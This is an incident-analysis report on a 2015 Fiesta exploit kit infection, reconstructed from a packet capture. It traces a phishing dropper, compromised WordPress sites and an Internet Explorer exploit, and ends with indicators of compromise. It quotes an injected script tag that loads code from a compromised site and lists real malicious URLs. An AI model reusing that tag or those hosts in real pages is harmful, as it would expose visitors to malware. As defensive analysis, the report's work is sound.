# Malware incident - 2015.05.29 - Fiesta EK payload - PCAP analysis report
> https://github.com/zefferno/malware_analysis/raw/master/fiesta_ek_pcap.zip

###### Report written by zefferno (zefferno@gmail.com)
###### October 2015

## Identifying the victim in the infection incident
Packet Capture contains a total of 9,799 packets. Packet statistics (Statistics->Endpoints) reveals two noisy MAC addresses that are associated with Dell Hardware (78:2b:cb:1a:b2:08) and Cisco hardware (00:1a:e2:1a:40:6a). 
The Dell machine is the victim machine in the incident, and Cisco is probably the Internet gateway on the local network. 

The Link-Local Multicast Name Resolution (LLMNR) session reveals that the suspected victim is associated with IP: "10.3.162.105", MAC address: "78:2b:cb:1a:b2:08" and has 
NetBIOS name: "Owen-PC". It is associated with a network group: WORKGROUP, which indicates that this machine is not part of a Windows domain.
The victim OS type can be identified by following the stream of the DHCP packets. OS broadcasts "MSFT 5.07", which indicates that the victim machine is running Windows 7. 
In addition, there are footprints for the OS type in the HTTP session.

## How the victim was infected?
Protocol Hierarchy Statistics (Statistics->Protocol Hierarchy) reveals that most frequently used protocol is TCP. 
This could indicate that the attack was carried out using a TCP protocol. To remove "noise" from the view, I used the following filter:

```
((((!(igmp and ip and eth and frame)) && !(icmp and ip and eth and frame)) && 
    !(bootp and udp and ip and eth and frame)) && !(udp.dstport == 5355)) && 
	!(nbns and udp and ip and eth and frame)
```

It removes IGMP, ICMP, BOOTP, LLMNR and NetBIOS name resolution packets from the view.

I looked for suspicious domains or IP addresses that may correspond to a malicious activity using the Resolved Addresses (Statistics->Resolved Addresses). 
There are total of 214 domain requests. The Packet Counter (Statistics->HTTP->Packet Counter) shows a total of 184 GET method requests and 9 POST method requests.
Additional filtering is needed, so I added filtering for HTTP POST/GET methods:

```
(((((!(igmp and ip and eth and frame)) && !(icmp and ip and eth and frame)) && !(bootp and udp and ip and eth and frame)) && 
     !(udp.dstport == 5355)) && !(dns and udp and ip and eth and frame)) && !(nbns and udp and ip and eth and frame) && 
	  (http.request.method == GET || http.request.method == POST)
```

After reading the traffic flow with the filtering in place, I managed to figure out the trigger for the attack:
1. User enters his Gmail account.
2. Victim machine sends HTTP GET request for a suspicious file hosted on sciclubtermeeuganee.it (149.3.144.218).
3. File is being downloaded.
4. File gets executed.

This indicate a phishing attack carried out by email message.

Domain: sciclubtermeeuganee.it is registered for organization named "Sci Club Terme Euganee" it is a ski club website located at Italy. 
It looks like a legitimate website that uses WordPress. But it might have been compromised by the attackers.
I followed the communication to this domain, and saved the ZIP file that was downloaded by the user from it. 
The ZIP contained a single filename: 'pdf_efax_message_3537462.pif'.

PIF (Program Information File) extension is a binary file that contains parameters on how to run executables on Windows. 
Windows 7 is prone to a vulnerability that may allow a file to automatically run because the OS fails to properly handle it correctly.
File type is 32-bit PE.

I searched for the file hash in VT and Metascan and found that it was already been flagged as well-known malware (uploaded on 24-06-15).
Looking at the Google domain session, I discovered that the user is running on MSIE 8 (Windows 7) and OS language is English.

```
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
```

## What happened right after the initial infection?
Few minutes after the file was downloaded by the user, the user runs it. There is a request to redirect the browser to: www.trionfobuilders.net with URL parameters.
I compared the HTML page with the original copy of the website, and found that it was compromised.
Notice the following src tag, "wp-content" looks familiar? --> compromised WordPress server again.

```html
<div id="banner"> <embed src='flash/header.swf' loop='false' menu='false' quality='high' width='786' height='159'></embed></DIV>
<A HREF="?id=company_profile" id='current'<script type="text/javascript" src="http://minibasketcorato.it/wp-content/themes/SPORTY-WP/36hqx4jk.php?id=62879545"></script>>Company Profile</A>
```

There is a POST request for moskalskiybodun.com (91.200.14.95). The user-agent is now different. It seems like the dropped executable (dropper) is trying to download data from 
remote server.

```
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
```

The dropper attempts to download executable named "bb.exe" from four different domains, some of them are not valid, and they show footprints of WordPress again. 
Eventually, the dropper downloads data from the domain: domdobleska.ru. Then there is an POST request for godfirestaris.ru (109.120.189.60). 
It sends key/value pairs over HTTP form to a PHP server. 

Keys: qmieaw, sqomkiay, uuuu, wyaceg1- wyaceg6, values are encoded, and seems to be encrypted.

What is more interested is the HTTP GET requests to www.disclose.tv (80.237.190.38). 
URL: http://www.disclose.tv/forum/cops-taser-pepper-spray-man-suffering-a-stroke-t105416.html.
I analyzed the files received from this domain, and found malicious content on them. 

The "gods.src" element in forum_fn.js in this site refers to the following URL address: http://www.disclose.tv/forum/phpbb_seo/phpbb_seo_default.php

```html
</script><script src="http://www.disclose.tv/forum/styles/prosilver/template/forum_fn.js"></script>
```

The file phpbb_seo_default.php has reference to open iframe calling another page at a different domain: http://wnnvpim.ddnsking.com/d73plybq/counter.php?id=2.

Domain wnnvpim.ddnsking.com (205.234.186.115) is owned by no-ip DDNS service. It resolves to an IP address belonging to ServerCentral, a company that provides hosted data center services. 
This server is running on nginx/1.4.4.

Looking at the traffic made to the wnnvpim.ddnsking.com domain, I found the following GET requests:
* Call to counter page (called from the phpbb mentioned above) which returns 0 in response.
* Page that contains obfuscated Javascript code (6236.htm).
* Another page that contains obfuscated Javascript code (7258.htm).
* 393Kb encrypted binary (payload.bin).

At this point, to figure out how to decrypt that binary, I had to analyze the scripts and to find the decryption code.
Looking at the code, it seems that this attack is generated by an Exploit-Kit (EK) dubbed 'FIESTA', this is a well-known kit that is very popular in the dark market.

The payload is decrypted by a shellcode from an exploit executed by the javascript. The script exploits a well-known vulnerability that is exists on Microsoft Internet Explorer browser: CVE-2013-2551. 
I used a python script to decrypt the delivered payload (bb_decrypted.exe_).

## Malicious activity done by the malware
Spear-phishing dropper executable (pdf_efax_message):
* Tries to read passwords from well-known applications (FlashFXP, CuteFTP, TotalCMD and more)
* Clones itself as C:\Program Files\Common Files\Adobe Photoshop Updater\aywa539e.exe
* Injects code to explorer.exe and wuauclt.exe processes
* Complete behavioral analysis is available on the following link: 
  https://www.virustotal.com/en/file/f7ea603361599bed0b24f771da5b1b01126423d438dab2a1bfc7c7e4f6a1abec/analysis/

CVE-2013-2551 payload:
* https://www.reverse.it/sample/ec6c13765b55cb268b104d24147b16674908a92bb3fb9591712769834291f5f9?environmentId=100
* https://www.virustotal.com/en/file/ec6c13765b55cb268b104d24147b16674908a92bb3fb9591712769834291f5f9/analysis/

## IOCs
|Property	|Value																|
|---		|---																|
|Filename   |pdf_efax_message_3537462.pif 										|
|SHA 256	|f7ea603361599bed0b24f771da5b1b01126423d438dab2a1bfc7c7e4f6a1abec   |
|Timestamp 	|28/05/2015 10:04:13												|
|File Type	|PE 32-bit  														|

|Property	|Value																|
|---		|---																|
|Filename   |bb.exe																|
|SHA 256	|ec6c13765b55cb268b104d24147b16674908a92bb3fb9591712769834291f5f9   |
|Timestamp 	|29/05/2015 11:20:17												|
|File Type	|PE 32-bit  														|

|Property	|Value																|
|---		|---																|
|Filename   |6236.htm															|
|SHA 256	|ebbf50f22246ca5c892c08e149627f3fabb53b60552639ae66bb657866ea7774   |
|Timestamp 	|																	|
|File Type	|HTML page with javascript code										|

|Property	|Value																|
|---		|---																|
|Filename   |7259.htm															|
|SHA 256	|13b4816ef532acdd8a948dce00f20e62428cce1a0167d45869adcbb0304c8d27   |
|Timestamp 	|																	|
|File Type	|HTML page with javascript code										|

### Domains
* hxxp://moskalskiybodun.com/gate.php
* hxxp://dkpconsulting.com/wp-content/plugins/cached_data/bb.exe
* hxxp://doc.giovanniborsi.it/wp-content/plugins/cached_data/bb.exe
* hxxp://dom660000.ru/wp-content/plugins/cached_data/bb.exe
* hxxp://domdobleska.ru/wp-content/plugins/cached_data/bb.exe
* hxxp://wnnvpim.ddnsking.com/d73plybq/counter.php?id=2
* hxxp://wnnvpim.ddnsking.com/d73plybq/?2
* hxxp://wnnvpim.ddnsking.com/d73plybq/FYB7H4-zCJcHcnIkircRzE8N39CUx4xAA2-Ulhc8QXlTZn
* hxxp://wnnvpim.ddnsking.com/d73plybq/DMR8J1UPl3gGOO15FUwdohyCqU5inv7KIIUEV32J-_CP
* hxxp://wnnvpim.ddnsking.com/d73plybq/DMR8J1UPl3gGOO15FUwdohyCqU5inv7KIIUEV32J-_CP.1
* List of additional hosts are available on reverse.it report

## References
https://tools.ietf.org/html/draft-huitema-perpass-dhcp-identifiers-00

https://en.wikipedia.org/wiki/Program_information_file

https://www.metascan-online.com/#!/results/file/6e1fde1a687741ef80dc438ee472b9db/regular

https://www.virustotal.com/en/file/f7ea603361599bed0b24f771da5b1b01126423d438dab2a1bfc7c7e4f6a1abec/analysis/

http://blog.trendmicro.com/trendlabs-security-intelligence/fiesta-exploit-kit-spreading-crypto-ransomware-who-is-affected/

https://nvd.nist.gov/vuln/detail/CVE-2013-2551

https://github.com/0x3a/tools/blob/master/fiesta-payload-decrypter.py
